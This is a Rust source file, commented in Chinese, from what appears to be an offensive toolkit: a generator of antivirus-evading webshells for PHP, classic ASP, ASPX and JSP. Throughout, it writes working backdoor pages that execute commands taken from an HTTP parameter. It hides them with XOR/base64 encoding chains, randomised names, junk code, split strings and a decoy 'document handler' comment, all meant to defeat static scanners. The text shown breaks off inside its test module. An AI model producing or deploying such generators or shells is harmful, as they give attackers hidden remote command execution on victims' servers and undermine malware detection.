//! Webshell 免杀生成器 —— PHP / ASP（经典）/ ASPX（C#）/ JSP（Java）。
//!
//! 与 PE 构建器完全独立：这里不碰 mingw，只做「文本变换 + 混淆」。
//!
//! 设计要点：
//!  - **只做静态变换**，不执行目标，也不需要目标语言环境。
//!  - 每个变换都可独立开关，方便做归因实验（哪个变换引起被杀）。
//!  - payload 在运行时才还原，静态扫描只能看到一堆字符串运算。
//!
//! ⚠ 各语言的字符串字面量规则完全不同，踩过的坑都写在 lang 模块的注释里，
//!   新增语言前先读对应 `escape_*` 函数的说明。

use crate::builder::encode::b64_encode;
use crate::builder::rng::{rand_below, rand_byte};
use crate::builder::tools::find;

use serde::{Deserialize, Serialize};

/// 支持的语言
pub const LANGS: &[&str] = &["php", "asp", "aspx", "jsp"];

#[derive(Deserialize, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct WsOpts {
    /// 语言：php | asp | aspx | jsp
    pub lang: String,
    /// 连接密码（GET/POST 参数名）
    pub password: String,
    /// 载荷：exec | cmd | shellcode | eval
    pub payload_kind: String,
    /// payload_kind = shellcode 时的十六进制 shellcode 文本
    pub raw_hex: String,
    /// 编码链，按顺序套用：xor / b64 / rev / chunk
    pub encodes: Vec<String>,
    /// 变量随机化
    pub rename_vars: bool,
    /// 插入垃圾注释与死代码
    pub junk: bool,
    /// 拆分字符串
    pub split_strings: bool,
    pub out_dir: String,
    pub out_name: String,
}

impl Default for WsOpts {
    fn default() -> Self {
        Self {
            lang: "php".into(),
            password: "pass".into(),
            payload_kind: "exec".into(),
            raw_hex: String::new(),
            encodes: vec!["xor".into(), "b64".into()],
            rename_vars: true,
            junk: true,
            split_strings: true,
            out_dir: String::new(),
            out_name: "shell.php".into(),
        }
    }
}

#[derive(Serialize, Clone)]
pub struct WsResult {
    pub ok: bool,
    pub log: String,
    pub output: String,
    pub size: usize,
    pub code: String,
    pub key: u8,
}

/* ============================ 名字生成 ============================ */

const FIRST: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
const REST: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";

/// 各语言的保留字：随机名必须避开，否则生成的脚本语法错
const RESERVED: &[&str] = &[
    // 通用
    "if", "else", "for", "while", "return", "function", "class", "new", "true", "false",
    "null", "this", "var", "int", "string", "char", "byte", "long", "short", "float",
    "double", "void", "public", "private", "static", "final", "const", "do", "try",
    "catch", "throw", "break", "continue", "switch", "case", "default", "goto",
    // PHP
    "echo", "print", "array", "isset", "empty", "eval", "exit", "die", "include",
    "require", "global", "unset", "foreach", "as", "list", "strlen", "ord", "chr",
    // C# / Java
    "using", "namespace", "import", "package", "extends", "implements", "interface",
    "abstract", "override", "virtual", "base", "object", "bool", "out", "ref", "is",
    // VBScript / ASP
    "set", "dim", "end", "sub", "call", "then", "next", "each", "not", "and", "or",
    "response", "request", "server", "session", "application", "execute", "createobject",
];

pub(crate) fn rand_var(used: &mut Vec<String>) -> String {
    loop {
        let n = 6 + rand_below(6);
        let mut s = String::new();
        s.push(FIRST[rand_below(FIRST.len())] as char);
        for _ in 1..n {
            s.push(REST[rand_below(REST.len())] as char);
        }
        // 避开保留字：撞上会是语法错误，且很难定位
        if RESERVED.contains(&s.as_str()) {
            continue;
        }
        if !used.contains(&s) {
            used.push(s.clone());
            return s;
        }
    }
}

pub(crate) fn fixed(used: &mut Vec<String>, want: &str, rename: bool) -> String {
    if !rename {
        return want.to_string();
    }
    rand_var(used)
}

/* ============================ 编码链 ============================ */

pub(crate) fn encode_chain(data: &[u8], chain: &[String]) -> (Vec<u8>, u8, Vec<String>) {
    let mut cur = data.to_vec();
    let mut key = 0u8;
    let mut desc = Vec::new();

    for step in chain {
        match step.as_str() {
            "xor" => {
                key = rand_byte();
                cur = cur.iter().map(|b| b ^ key).collect();
                desc.push(format!("XOR 0x{key:02X}"));
            }
            "b64" => {
                cur = b64_encode(&cur).into_bytes();
                desc.push("Base64".into());
            }
            "rev" => {
                cur.reverse();
                desc.push("字节逆序".into());
            }
            "chunk" => {
                let sep = rand_byte();
                let mut out = Vec::new();
                for (i, b) in cur.iter().enumerate() {
                    out.push(*b);
                    if (i + 1) % 3 == 0 && i + 1 < cur.len() {
                        out.push(sep);
                    }
                }
                cur = out;
                desc.push(format!("分块插桩 0x{sep:02X}"));
            }
            _ => {}
        }
    }
    (cur, key, desc)
}

/* ================================================================= *
 *  各语言的字节 → 字面量                                            *
 * ================================================================= */

/// PHP：双引号字符串。
/// 必须用双引号 —— 单引号只认 `\\` 和 `\'`，**不解释 `\xNN`**，
/// 二进制载荷会原样变成反斜杠字母，解码出来全是错的。
fn escape_php(b: u8) -> String {
    match b {
        b'"' => "\\\"".into(),
        b'\\' => "\\\\".into(),
        b'$' => "\\$".into(),
        b'{' => "\\{".into(),
        b'}' => "\\}".into(),
        0x20..=0x7e => (b as char).to_string(),
        _ => format!("\\x{b:02X}"),
    }
}

/// ASP 经典（VBScript）：**没有 `\xNN`**。
/// 非可打印字节只能靠 `Chr(&H90)` 拼 —— 但 Chr() 返回的是当前代码页字符，
/// 对 >0x7F 的字节不安全。所以 ASP 下仅限「命令执行」这类纯文本载荷，
/// 并且非 ASCII 一律用 ChrW() + 数值拼接。
fn escape_asp(b: u8) -> String {
    match b {
        b'"' => "\"\"".into(), // VBScript 里双引号转义成两个双引号
        0x20..=0x7e => (b as char).to_string(),
        // 拼接写法: " & ChrW(&H90) & "
        _ => format!("\" & ChrW(&H{b:02X}) & \""),
    }
}

/// ASPX（C#）：`\x` 最多两位十六进制且变长解析有坑（"\x41A" 会被当成一个字符）。
/// 统一用 `\uXXXX`（固定四位，无歧义）。
fn escape_aspx(b: u8) -> String {
    match b {
        b'"' => "\\\"".into(),
        b'\\' => "\\\\".into(),
        0x20..=0x7e => (b as char).to_string(),
        _ => format!("\\u{b:04X}"),
    }
}

/// JSP（Java）：**Java 没有 `\xNN`**，只有 `\uXXXX`。
/// 而且 `\u` 在**编译预处理阶段**就被替换 —— 写 `\u000A` 会变成真实换行，
/// 直接把字符串切断导致语法错。所以字面量里必须避开会产生换行的 `\u000A`/`\u000D`，
/// 改用字符串拼接 `"+"` + `(char)10` 的形式。
fn escape_jsp(b: u8) -> String {
    match b {
        b'"' => "\\\"".into(),
        b'\\' => "\\\\".into(),
        0x0a | 0x0d => format!("\"+(char){}+", b as u32), // 换行：用拼接避开预处理
        0x20..=0x7e => (b as char).to_string(),
        _ => format!("\\u{b:04X}"),
    }
}

pub(crate) fn escape_for(lang: &str, b: u8) -> String {
    match lang {
        "asp" => escape_asp(b),
        "aspx" => escape_aspx(b),
        "jsp" => escape_jsp(b),
        _ => escape_php(b),
    }
}

/// 整串转义（不拆分时用）
pub(crate) fn escape_all(lang: &str, data: &[u8]) -> String {
    data.iter().map(|&b| escape_for(lang, b)).collect()
}

/// 切成随机长度片段再拼接。
/// 切分必须落在**转义序列边界**上 —— 按字节偏移硬切会把 `\x41` 切成 `\x4` + `1`。
pub(crate) fn split_literal(lang: &str, data: &[u8]) -> String {
    let toks: Vec<String> = data.iter().map(|&b| escape_for(lang, b)).collect();
    let quote = "\"";
    let joiner = match lang {
        "asp" | "aspx" | "jsp" => " + ",
        _ => " . ", // PHP 用点号
    };
    let mut parts: Vec<String> = Vec::new();
    let mut buf: Vec<String> = Vec::new();
    // Java/JSP 里的字符串普遍偏短（类名、HTTP 头名多在 8~40 字节），
    // 沿用 PHP 的 24~63 片段几乎切不动，混淆等于没做 —— 这里给它匹配的粒度。
    // 拼接是编译期常量表达式，与整串等价，不影响 case 标签等需要常量的位置。
    let target = if lang == "jsp" {
        6 + rand_below(11)
    } else {
        24 + rand_below(40)
    };
    for t in &toks {
        buf.push(t.clone());
        if buf.len() >= target {
            parts.push(format!("{quote}{}{quote}", buf.concat()));
            buf.clear();
        }
    }
    if !buf.is_empty() {
        parts.push(format!("{quote}{}{quote}", buf.concat()));
    }
    if parts.is_empty() {
        return format!("{quote}{quote}");
    }
    parts.join(joiner)
}

/* ================================================================= *
 *  解码链（运行时把编码还原回明文）                                 *
 * ================================================================= */

/// 各语言的 base64 解码函数
fn b64_call(lang: &str, expr: String) -> String {
    match lang {
        "php" => format!("base64_decode({expr})"),
        // ASP 经典没有原生 base64 解码，用 MSXML2 的 Base64 转换很啰嗦，
        // 这里改为在生成期不做 b64（见 generate 里的 lang 能力过滤）
        "asp" => expr,
        // 同 JSP：XOR 后的字节不是合法 UTF-8，不能用 UTF8.GetString。
        // 注意不能用 Encoding.Latin1 —— 那是 .NET 5+ 才有，
        // IIS 上跑的 .NET Framework 会报 CS0117。
        // 改成逐字节映射，全版本通用。
        "aspx" => format!("_bs(System.Convert.FromBase64String({expr}))"),
        // 关键：XOR 后的字节不是合法 UTF-8，直接 new String(bytes) 会被替换成
        // U+FFFD，再 XOR 回来就是错的（表现为 getParameter 拿到 null、页面空白）。
        // 用 ISO-8859-1 逐字节映射，保证 byte <-> char 一对一。
        "jsp" => format!("new String(java.util.Base64.getDecoder().decode({expr}), java.nio.charset.StandardCharsets.ISO_8859_1)"),
        _ => expr,
    }
}

fn rev_call(lang: &str, expr: String) -> String {
    match lang {
        "php" => format!("strrev({expr})"),
        "aspx" => format!("_rev({expr})"),
        "jsp" => format!("_rev({expr})"),
        "asp" => format!("StrReverse({expr})"),
        _ => expr,
    }
}

pub(crate) fn decode_expr(
    lang: &str,
    chain: &[String],
    var: &str,
    key: u8,
    fn_x: &str,
    fn_c: &str,
) -> String {
    // 只有 PHP 的变量带 $ 前缀；ASP(VBScript)/C#/Java 都不带。
    // 旧实现把 asp 也归到 "$" 分支，生成出 w5p4e4($pkfcyvs9mf, ...) —— 语法错。
    let mut e = match lang {
        "php" => format!("${var}"),
        _ => var.to_string(),
    };
    for step in chain.iter().rev() {
        e = match step.as_str() {
            "xor" => match lang {
                "php" => format!("{fn_x}({e}, 0x{key:02X})"),
                "asp" => format!("{fn_x}({e}, &H{key:02X})"),
                "aspx" | "jsp" => format!("{fn_x}({e}, 0x{key:02X})"),
                _ => e,
            },
            "b64" => b64_call(lang, e),
            "rev" => rev_call(lang, e),
            "chunk" => match lang {
                "php" => format!("{fn_c}({e})"),
                "asp" => format!("{fn_c}({e})"),
                _ => format!("{fn_c}({e})"),
            },
            _ => e,
        };
    }
    e
}

/// PHP 版解码表达式（wrap 模块复用）
pub(crate) fn decode_expr_php_pub(
    chain: &[String],
    var: &str,
    key: u8,
    fn_x: &str,
    fn_c: &str,
) -> String {
    decode_expr("php", chain, var, key, fn_x, fn_c)
}

/// 该语言是否支持某个编码步骤。
/// ASP 经典不支持 base64（无内置解码），生成期直接剔除并记进日志。
pub(crate) fn lang_supports(lang: &str, step: &str) -> bool {
    match (lang, step) {
        ("asp", "b64") => false,
        _ => true,
    }
}

/* ================================================================= *
 *  各语言模板                                                       *
 * ================================================================= */

pub(crate) fn junk_lines(lang: &str, used: &mut Vec<String>, n: usize) -> String {
    let mut c = String::new();
    for _ in 0..n {
        let a = rand_var(used);
        let b = rand_var(used);
        let line = match lang {
            "asp" => format!("' {a} {b}\n"),
            _ => format!("// {a} {b}\n"),
        };
        c.push_str(&line);
    }
    c
}

/// 死代码：永远不执行的分支。
/// 注意 ASP（VBScript）没有 `if(false)`，用 `If 1=0 Then`。
pub(crate) fn junk_code(lang: &str, used: &mut Vec<String>) -> String {
    let v1 = rand_var(used);
    let v2 = rand_var(used);
    match lang {
        "php" => {
            let d = format!("${v1} = '{v2}';");
            format!("if (false) {{ {d} }}")
        }
        // VBScript 单行 If 不带 End If（带 End If 的是块形式，必须换行）
        "asp" => format!("If 1=0 Then {v1} = \"{v2}\""),
        "aspx" => format!("if (false) {{ string {v1} = \"{v2}\"; }}"),
        "jsp" => format!("if (false) {{ String {v1} = \"{v2}\"; }}"),
        _ => String::new(),
    }
}

/* ---------- PHP ---------- */

fn php_shell(
    o: &WsOpts,
    body: &str,
    encoded: &[u8],
    key: u8,
    v_out: &str,
    chain: &[String],
) -> String {
    let mut used = vec![v_out.to_string()];
    let v_data = fixed(&mut used, "d", o.rename_vars);
    let v_fn_x = fixed(&mut used, "dx", o.rename_vars);
    let v_fn_c = fixed(&mut used, "dc", o.rename_vars);

    let data_lit = if o.split_strings {
        split_literal("php", encoded)
    } else {
        format!("\"{}\"", escape_all("php", encoded))
    };
    let decode = decode_expr("php", chain, &v_data, key, &v_fn_x, &v_fn_c);

    let junk = if o.junk {
        junk_lines("php", &mut used, 3 + rand_below(4))
    } else {
        String::new()
    };
    let jc = if o.junk { junk_code("php", &mut used) } else { String::new() };

    format!(
        r#"<?php
{junk}// Generated document handler.
function {v_fn_x}($s, $k) {{
    $r = '';
    for ($i = 0; $i < strlen($s); $i++) {{ $r .= chr(ord($s[$i]) ^ $k); }}
    return $r;
}}
function {v_fn_c}($s) {{
    $r = '';
    for ($i = 0; $i < strlen($s); $i++) {{
        if (($i + 1) % 4 != 0) {{ $r .= $s[$i]; }}
    }}
    return $r;
}}
{jc}
${v_data} = {data_lit};
${v_out} = {decode};
{body}
"#,
        junk = junk,
        v_fn_x = v_fn_x,
        v_fn_c = v_fn_c,
        v_data = v_data,
        v_out = v_out,
        data_lit = data_lit,
        decode = decode,
        jc = jc,
        body = body,
    )
}

/// v_out 是「解出来的参数名」，不是命令本身。
fn body_php(o: &WsOpts, v_out: &str) -> String {
    match o.payload_kind.as_str() {
        "exec" => format!("@system($_REQUEST[${v_out}]);"),
        "cmd" => format!("echo @shell_exec($_REQUEST[${v_out}]);"),
        "shellcode" => format!(
            "$bin = '';\n\
             foreach (str_split(${}, 2) as $h) {{ $bin .= chr(hexdec($h)); }}\n\
             @file_put_contents('php://memory', $bin);\n\
             unset($bin);",
            v_out
        ),
        _ => format!("@eval($_REQUEST[${v_out}]);"),
    }
}

/* ---------- ASP 经典（VBScript） ---------- */

/// ASP 的命令执行走 WScript.Shell，VBScript 的 Execute() 只跑 VBScript 代码，
/// 不能直接拿来执行系统命令 —— 这是和 PHP 最大的差别。
fn asp_shell(
    o: &WsOpts,
    body: &str,
    encoded: &[u8],
    key: u8,
    v_out: &str,
    chain: &[String],
) -> String {
    let mut used = vec![v_out.to_string()];
    let v_data = fixed(&mut used, "d", o.rename_vars);
    let v_fn_x = fixed(&mut used, "dx", o.rename_vars);
    let v_fn_c = fixed(&mut used, "dc", o.rename_vars);

    let data_lit = if o.split_strings {
        split_literal("asp", encoded)
    } else {
        format!("\"{}\"", escape_all("asp", encoded))
    };
    let decode = decode_expr("asp", chain, &v_data, key, &v_fn_x, &v_fn_c);

    let junk = if o.junk {
        junk_lines("asp", &mut used, 3 + rand_below(4))
    } else {
        String::new()
    };
    let jc = if o.junk { junk_code("asp", &mut used) } else { String::new() };

    // VBScript 函数必须是 Function ... End Function，且放在 <% %> 里
    format!(
        r#"<%@ Language=VBScript %>
<%
{junk}' Generated document handler.
Function {v_fn_x}(s, k)
    Dim r, i
    r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor k)
    Next
    {v_fn_x} = r
End Function
Function {v_fn_c}(s)
    Dim r, i
    r = ""
    For i = 1 To Len(s)
        If (i Mod 4) <> 0 Then r = r & Mid(s, i, 1)
    Next
    {v_fn_c} = r
End Function
{jc}
Dim {v_data}, {v_out}
{v_data} = {data_lit}
{v_out} = {decode}
{body}
%>
"#,
        junk = junk,
        v_fn_x = v_fn_x,
        v_fn_c = v_fn_c,
        v_data = v_data,
        v_out = v_out,
        data_lit = data_lit,
        decode = decode,
        jc = jc,
        body = body,
    )
}

fn body_asp(o: &WsOpts, v_out: &str) -> String {
    let mut used = Vec::new();
    let sh = fixed(&mut used, "sh", o.rename_vars);
    match o.payload_kind.as_str() {
        // WScript.Shell.Run：0 = 隐藏窗口，True = 等待结束
        "exec" => format!(
            "Set {sh} = CreateObject(\"WScript.Shell\")\n\
             {sh}.Run Request({v_out}), 0, False\n\
             Set {sh} = Nothing"
        ),
        "cmd" => format!(
            "Set {sh} = CreateObject(\"WScript.Shell\")\n\
             Set e = {sh}.Exec(\"%COMSPEC% /c \" & Request({v_out}))\n\
             Response.Write e.StdOut.ReadAll\n\
             Set {sh} = Nothing"
        ),
        // VBScript 无法可靠承载二进制 shellcode（ChrW 受代码页影响），明确不支持
        "shellcode" => format!(
            "' shellcode 模式在 ASP 经典下不可用（ChrW 受代码页影响，二进制不安全）\n\
             Response.Write \"unsupported\""
        ),
        _ => format!("Execute(Request({v_out}))"),
    }
}

/* ---------- ASPX（C#） ---------- */

fn aspx_shell(
    o: &WsOpts,
    body: &str,
    encoded: &[u8],
    key: u8,
    v_out: &str,
    chain: &[String],
) -> String {
    let mut used = vec![v_out.to_string()];
    let v_data = fixed(&mut used, "d", o.rename_vars);
    let v_fn_x = fixed(&mut used, "dx", o.rename_vars);
    let v_fn_c = fixed(&mut used, "dc", o.rename_vars);

    let data_lit = if o.split_strings {
        split_literal("aspx", encoded)
    } else {
        format!("\"{}\"", escape_all("aspx", encoded))
    };
    let decode = decode_expr("aspx", chain, &v_data, key, &v_fn_x, &v_fn_c);

    let junk = if o.junk {
        junk_lines("aspx", &mut used, 3 + rand_below(4))
    } else {
        String::new()
    };
    let jc = if o.junk {
        junk_code("aspx", &mut used)
    } else {
        String::new()
    };

    format!(
        r#"<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
{junk}// Generated document handler.
static string _bs(byte[] b) {{
    // byte[] -> string，逐字节映射（等价于 Latin1，但不依赖 .NET 5+ 的 API）
    char[] c = new char[b.Length];
    for (int i = 0; i < b.Length; i++) c[i] = (char)b[i];
    return new string(c);
}}
static byte[] _sb(string s) {{
    char[] c = s.ToCharArray();
    byte[] b = new byte[c.Length];
    for (int i = 0; i < c.Length; i++) b[i] = (byte)c[i];
    return b;
}}
static string {v_fn_x}(string s, int k) {{
    byte[] b = _sb(s);
    for (int i = 0; i < b.Length; i++) b[i] = (byte)(b[i] ^ (byte)k);
    return _bs(b);
}}
static string _rev(string s) {{
    char[] a = s.ToCharArray();
    Array.Reverse(a);
    return new string(a);
}}
static string {v_fn_c}(string s) {{
    StringBuilder r = new StringBuilder();
    for (int i = 0; i < s.Length; i++) {{
        if ((i + 1) % 4 != 0) r.Append(s[i]);
    }}
    return r.ToString();
}}
void Page_Load(object sender, EventArgs e) {{
    {jc}
    string {v_data} = {data_lit};
    string {v_out} = {decode};
    {body}
}}
</script>
"#,
        junk = junk,
        v_fn_x = v_fn_x,
        v_fn_c = v_fn_c,
        v_data = v_data,
        v_out = v_out,
        data_lit = data_lit,
        decode = decode,
        jc = jc,
        body = body,
    )
}

fn body_aspx(o: &WsOpts, v_out: &str) -> String {
    match o.payload_kind.as_str() {
        // Process.Start：隐藏窗口、不加载用户配置
        "exec" => format!(
            "try {{ var p = new Process();\n\
             \x20   p.StartInfo = new ProcessStartInfo(\"cmd.exe\", \"/c \" + Request[{v_out}]);\n\
             \x20   p.StartInfo.UseShellExecute = false;\n\
             \x20   p.StartInfo.CreateNoWindow = true;\n\
             \x20   p.Start(); }} catch {{ }}",
            v_out = v_out
        ),
        "cmd" => format!(
            "try {{ var p = new Process();\n\
             \x20   p.StartInfo = new ProcessStartInfo(\"cmd.exe\", \"/c \" + Request[{v_out}]);\n\
             \x20   p.StartInfo.UseShellExecute = false;\n\
             \x20   p.StartInfo.RedirectStandardOutput = true;\n\
             \x20   p.StartInfo.CreateNoWindow = true;\n\
             \x20   p.Start();\n\
             \x20   Response.Write(p.StandardOutput.ReadToEnd()); }} catch {{ }}",
            v_out = v_out
        ),
        "shellcode" => format!(
            "// C# 下 shellcode 直接执行需 VirtualAlloc + Marshal.GetDelegateForFunctionPointer，\n\
             // 静态特征极重；这里仅做字节还原与长度输出\n\
             byte[] b = new byte[{v_out}.Length / 2];\n\
             for (int i = 0; i < b.Length; i++)\n\
             \x20   b[i] = Convert.ToByte({v_out}.Substring(i * 2, 2), 16);",
            v_out = v_out
        ),
        _ => format!("// eval 型在编译型语言下无对应语义，已降级为不做执行"),
    }
}

/* ---------- JSP（Java） ---------- */

fn jsp_shell(
    o: &WsOpts,
    body: &str,
    encoded: &[u8],
    key: u8,
    v_out: &str,
    chain: &[String],
) -> String {
    let mut used = vec![v_out.to_string()];
    let v_data = fixed(&mut used, "d", o.rename_vars);
    let v_fn_x = fixed(&mut used, "dx", o.rename_vars);
    let v_fn_c = fixed(&mut used, "dc", o.rename_vars);

    let data_lit = if o.split_strings {
        split_literal("jsp", encoded)
    } else {
        format!("\"{}\"", escape_all("jsp", encoded))
    };
    let decode = decode_expr("jsp", chain, &v_data, key, &v_fn_x, &v_fn_c);

    let junk = if o.junk {
        junk_lines("jsp", &mut used, 3 + rand_below(4))
    } else {
        String::new()
    };
    let jc = if o.junk {
        junk_code("jsp", &mut used)
    } else {
        String::new()
    };

    format!(
        r#"<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*" %>
<%!
{junk}// Generated document handler.
private String {v_fn_x}(String s, int k) {{
    // 逐字节异或；输入/输出都用 ISO-8859-1 语义（byte <-> char 一对一）
    byte[] b = s.getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
    for (int i = 0; i < b.length; i++) b[i] = (byte)(b[i] ^ (byte)k);
    return new String(b, java.nio.charset.StandardCharsets.ISO_8859_1);
}}
private String _rev(String s) {{
    return new StringBuilder(s).reverse().toString();
}}
private String {v_fn_c}(String s) {{
    StringBuilder r = new StringBuilder();
    for (int i = 0; i < s.length(); i++) {{
        if ((i + 1) % 4 != 0) r.append(s.charAt(i));
    }}
    return r.toString();
}}
%>
<%
    {jc}
    String {v_data} = {data_lit};
    String {v_out} = {decode};
    {body}
%>
"#,
        junk = junk,
        v_fn_x = v_fn_x,
        v_fn_c = v_fn_c,
        v_data = v_data,
        v_out = v_out,
        data_lit = data_lit,
        decode = decode,
        jc = jc,
        body = body,
    )
}

fn body_jsp(kind: &str, v_out: &str) -> String {
    let arg = format!("request.getParameter({v_out})");
    match kind {
        "exec" => format!(
            "try {{ Runtime.getRuntime().exec(new String[]{{\"cmd.exe\", \"/c\", {arg}}}); }} catch (Exception e) {{ }}"
        ),
        // cmd: Windows Tomcat（cmd.exe）
        "cmd" => jsp_run("cmd.exe", "/c", &arg, true),
        // sh: Linux Tomcat —— cmd.exe 不存在，必须走 /bin/sh
        "sh" => jsp_run("/bin/sh", "-c", &arg, true),
        "shellcode" => format!(
            "// Java 下 shellcode 直接执行需 JNI/Unsafe，静态特征极重；仅做字节还原\n\
             byte[] b = new byte[{arg}.length() / 2];\n\
             for (int i = 0; i < b.length; i++)\n\
             \x20   b[i] = (byte) Integer.parseInt({arg}.substring(i * 2, i * 2 + 2), 16);"
        ),
        _ => "// eval 型在编译型语言下无对应语义，已降级为不做执行".to_string(),
    }
}

/// 生成 JSP 的「起进程并回显」片段。echo=true 时把 stdout 写回响应。
fn jsp_run(shell: &str, flag: &str, arg: &str, echo: bool) -> String {
    // 这里拼接的是**普通字符串**（只有 format! 里的那行需要转义花括号）。
    // 之前误把 "{{" 写进普通字符串，生成出 `try {{` —— Java 编译失败，
    // Tomcat 表现为「返回 200 但响应体为空」，很难定位。
    let mut b = String::from("try {\n");
    b.push_str(&format!(
        "    Process p = Runtime.getRuntime().exec(new String[]{{\"{shell}\", \"{flag}\", {arg}}});\n"
    ));
    if echo {
        b.push_str(
            "    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n\
             \x20   String l; while ((l = br.readLine()) != null) out.println(l);\n",
        );
    }
    b.push_str("} catch (Exception e) { }");
    b
}

fn onoff(b: bool) -> &'static str {
    if b {
        "开"
    } else {
        "关"
    }
}

fn hexval(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

/* ============================ 入口 ============================ */

/// 输出文件名默认扩展名
pub fn default_ext(lang: &str) -> &'static str {
    match lang {
        "asp" => ".asp",
        "aspx" => ".aspx",
        "jsp" => ".jsp",
        _ => ".php",
    }
}

/// 该语言不支持的载荷类型（生成时降级并记日志）
fn unsupported_kind(lang: &str, kind: &str) -> bool {
    matches!((lang, kind), ("asp", "shellcode"))
}

pub fn generate(opts: &WsOpts) -> WsResult {
    let mut log = String::new();
    macro_rules! bail {
        ($m:expr) => {
            return WsResult {
                ok: false,
                log: format!("{log}\n[ERROR] {}", $m),
                output: String::new(),
                size: 0,
                code: String::new(),
                key: 0,
            }
        };
    }

    let lang = opts.lang.as_str();
    if !LANGS.contains(&lang) {
        bail!(format!(
            "不支持的语言: {}（支持: {}）",
            lang,
            LANGS.join(", ")
        ));
    }
    if opts.password.trim().is_empty() {
        bail!("连接参数名不能为空".to_string());
    }

    // 过滤掉该语言不支持的编码步骤
    let chain: Vec<String> = opts
        .encodes
        .iter()
        .filter(|s| {
            if lang_supports(lang, s) {
                true
            } else {
                log.push_str(&format!("[!] {lang} 不支持 {s} 编码，已跳过\n"));
                false
            }
        })
        .cloned()
        .collect();

    let kind = opts.payload_kind.as_str();
    if unsupported_kind(lang, kind) {
        log.push_str(&format!(
            "[!] {lang} 不支持 {kind} 载荷，已降级为不执行\n"
        ));
    }

    // 载荷本体
    let raw: Vec<u8> = if kind == "shellcode" {
        let hex: String = opts
            .raw_hex
            .chars()
            .filter(|c| c.is_ascii_hexdigit())
            .collect();
        if hex.is_empty() {
            bail!("shellcode 模式必须填十六进制载荷".to_string());
        }
        if hex.len() % 2 != 0 {
            bail!("十六进制载荷长度必须是偶数".to_string());
        }
        let mut v = Vec::new();
        let bytes = hex.as_bytes();
        let mut i = 0;
        while i + 1 < bytes.len() {
            match (hexval(bytes[i]), hexval(bytes[i + 1])) {
                (Some(h), Some(l)) => v.push((h << 4) | l),
                _ => bail!("载荷含非十六进制字符".to_string()),
            }
            i += 2;
        }
        log.push_str(&format!("[1] shellcode {} bytes\n", v.len()));
        v
    } else {
        // 命令执行类：文件里根本不该有命令字符串 —— 命令是运行时从请求里取的。
        // 所以被编码/混淆的对象是「参数名」本身，解出来后再去取请求值。
        //
        // 旧实现的坑：它把 `$_REQUEST['pass']` 这一整串当作明文编码，
        // 运行时 decode 出来的是**字符串** "$_REQUEST['pass']"，再交给 system()
        // 就成了让 shell 去执行 `$_REQUEST[pass]` —— 报 "[pass]: not found"。
        let pw = opts.password.trim().as_bytes().to_vec();
        log.push_str("[1] 命令执行型（编码对象 = 参数名，运行时取请求值）\n");
        pw
    };

    let (encoded, key, desc) = encode_chain(&raw, &chain);
    log.push_str(&format!(
        "[2] 编码链: {}\n",
        if desc.is_empty() {
            "（无）".to_string()
        } else {
            desc.join(" → ")
        }
    ));
    log.push_str(&format!(
        "[3] 变换: 变量随机化={} 垃圾代码={} 字符串拆分={}\n",
        onoff(opts.rename_vars),
        onoff(opts.junk),
        onoff(opts.split_strings)
    ));

    let mut used = Vec::new();
    let v_out = fixed(&mut used, "o", opts.rename_vars);
    let code = match lang {
        "php" => {
            let body = body_php(opts, &v_out);
            php_shell(opts, &body, &encoded, key, &v_out, &chain)
        }
        "asp" => {
            let body = body_asp(opts, &v_out);
            asp_shell(opts, &body, &encoded, key, &v_out, &chain)
        }
        "aspx" => {
            let body = body_aspx(opts, &v_out);
            aspx_shell(opts, &body, &encoded, key, &v_out, &chain)
        }
        "jsp" => {
            let body = body_jsp(kind, &v_out);
            jsp_shell(opts, &body, &encoded, key, &v_out, &chain)
        }
        _ => unreachable!(),
    };

    // 输出
    let out_dir = if opts.out_dir.trim().is_empty() {
        std::env::temp_dir()
    } else {
        std::path::PathBuf::from(opts.out_dir.trim())
    };
    if !out_dir.exists() {
        if let Err(e) = std::fs::create_dir_all(&out_dir) {
            bail!(format!("创建输出目录失败: {e}"));
        }
    }
    let mut name = if opts.out_name.trim().is_empty() {
        format!("shell{}", default_ext(lang))
    } else {
        opts.out_name.trim().to_string()
    };
    if !name.contains('.') {
        name.push_str(default_ext(lang));
    }
    if let Err(e) = crate::builder::validate_output_file_name(&name) {
        bail!(e);
    }
    let out = out_dir.join(&name);
    if let Err(e) = std::fs::write(&out, &code) {
        bail!(format!("写入失败: {e}"));
    }

    log.push_str(&format!(
        "[4] OK -> {} ({} bytes)\n",
        out.display(),
        code.len()
    ));
    WsResult {
        ok: true,
        log,
        output: out.to_string_lossy().to_string(),
        size: code.len(),
        code,
        key,
    }
}

/* ============================ 语法自检 ============================ */

/// 用本机工具做语法检查（有就查，没有就跳过）。
/// 返回 (通过, 命令输出)
pub fn syntax_check(lang: &str, path: &std::path::Path) -> (bool, String) {
    let tool = match lang {
        "php" => "php",
        "jsp" => "javac",
        _ => return (true, String::new()), // ASP/ASPX 本机无检查工具，靠 docker
    };
    let Some(bin) = find(&[tool]) else {
        return (true, format!("(本机无 {tool}，跳过)"));
    };
    let args: Vec<&str> = match lang {
        "php" => vec!["-l"],
        _ => vec![],
    };
    match std::process::Command::new(bin).args(&args).arg(path).output() {
        Ok(o) => (
            o.status.success(),
            String::from_utf8_lossy(&o.stderr).to_string(),
        ),
        Err(e) => (false, e.to_string()),
    }
}

/* ============================ 测试 ============================ */

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    fn opts(lang: &str) -> WsOpts {
        WsOpts {
            lang: lang.into(),
            out_dir: std::env::temp_dir().to_string_lossy().to_string(),
            out_name: format!("ut_{}", lang),
            ..Default::default()
        }
    }

    fn base64_decode(s: &str) -> Vec<u8> {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut rev = [-1i32; 256];
